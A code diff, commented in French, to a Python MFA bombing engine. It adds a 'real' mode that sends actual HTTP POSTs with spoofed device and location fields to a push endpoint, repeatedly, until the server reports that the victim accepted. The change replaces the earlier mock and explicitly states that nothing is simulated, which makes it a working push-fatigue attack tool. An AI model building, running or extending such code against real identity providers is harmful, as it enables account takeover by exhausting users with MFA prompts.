@@ -63,6 +63,7 @@ class PushAttempt:
     success: bool | None = None
     response_code: int | None = None
     response_body: str | None = None
+    push_n: int = 0                 # n° du push (réel : renvoyé par l'IdP)
 
 
 @dataclass
@@ -80,6 +81,8 @@ class BombingCampaign:
     accepted_attempt: PushAttempt | None = None
     is_running: bool = False
     stop_event: asyncio.Event = field(default_factory=asyncio.Event)
+    real: bool = False                # mode RÉEL : POST HTTP vers push_url
+    push_url: str = ""                # endpoint HTTP réel des pushes (labo/IdP)
 
     @property
     def target_username(self) -> str:
@@ -142,6 +145,8 @@ class MFABombingEngine:
         interval_seconds: float = 30.0,
         max_attempts: int = 60,
         auto_accept_callback: Callable[[PushAttempt], bool] | None = None,
+        push_url: str = "",      # mode RÉEL : endpoint HTTP des pushes
+        real: bool = False,      # mode RÉEL : POST httpx, décision serveur
     ) -> BombingCampaign:
         """
         Démarre une campagne de MFA bombing.
@@ -149,6 +154,10 @@ class MFABombingEngine:
         auto_accept_callback : hook permettant de simuler une acceptation
         (utile pour les tests en labo). En production, l'acceptation dépend
         de la victime.
+
+        Mode RÉEL (real=True) : chaque push est un POST httpx réel vers
+        push_url ; la réponse {"decision":"allow"} du serveur déclenche
+        le stop-on-accept (plus aucun push ensuite). Aucun mock.
         """
         campaign = BombingCampaign(
             campaign_id=str(uuid.uuid4()),
@@ -157,6 +166,8 @@ class MFABombingEngine:
             start_ts=time.time(),
             interval_seconds=interval_seconds,
             max_attempts=max_attempts,
+            real=real,
+            push_url=push_url,
         )
         campaign.stop_event = asyncio.Event()
         self.campaigns[campaign.campaign_id] = campaign
@@ -209,8 +220,11 @@ class MFABombingEngine:
                     break
                 attempt = self._craft_attempt(campaign, i)
                 campaign.attempts.append(attempt)
-                # Soumission effective (mock ici ; en réel : httpx vers l'endpoint)
-                await self._submit_push(attempt)
+                # Soumission : réelle (httpx vers push_url) ou neutre (labo)
+                if campaign.real and campaign.push_url:
+                    await self._submit_push_real(campaign, attempt)
+                else:
+                    await self._submit_push(attempt)
 
                 # Hook de simulation d'acceptation
                 if auto_accept and auto_accept(attempt):
@@ -267,6 +281,47 @@ class MFABombingEngine:
             timestamp=time.time(),
             correlation_id=str(uuid.uuid4()),
         )
+
+    async def _submit_push_real(self, campaign: BombingCampaign,
+                                attempt: PushAttempt) -> None:
+        """Envoie le push MFA en RÉEL : POST httpx vers campaign.push_url.
+
+        La réponse décide de tout : {"decision":"allow"} = l'utilisateur a
+        accepté (succès réel), tout le reste = refus. Aucun résultat simulé.
+        """
+        import httpx
+
+        payload = {
+            "user": attempt.username,
+            "target": attempt.target.value,
+            "push_n": len(campaign.attempts),
+            "attempt_id": attempt.attempt_id,
+            "device": attempt.device_spoofed,
+            "location": attempt.location_spoofed,
+            "ts": attempt.timestamp,
+        }
+        try:
+            resp = await asyncio.to_thread(
+                httpx.post, campaign.push_url, json=payload,
+                timeout=10.0,
+            )
+        except httpx.HTTPError as exc:
+            attempt.success = False
+            attempt.response_code = 0
+            attempt.response_body = f"network error: {exc}"
+            return
+        attempt.response_code = resp.status_code
+        attempt.response_body = resp.text[:500]
+        try:
+            decision = (resp.json() or {}).get("decision", "")
+        except ValueError:
+            decision = ""
+        if resp.status_code == 200 and decision == "allow":
+            attempt.success = True
+            attempt.push_n = int(resp.json().get("push_n", 0))
+            campaign.accepted_attempt = attempt
+        else:
+            attempt.success = False
 
     async def _submit_push(self, attempt: PushAttempt) -> None:
         """
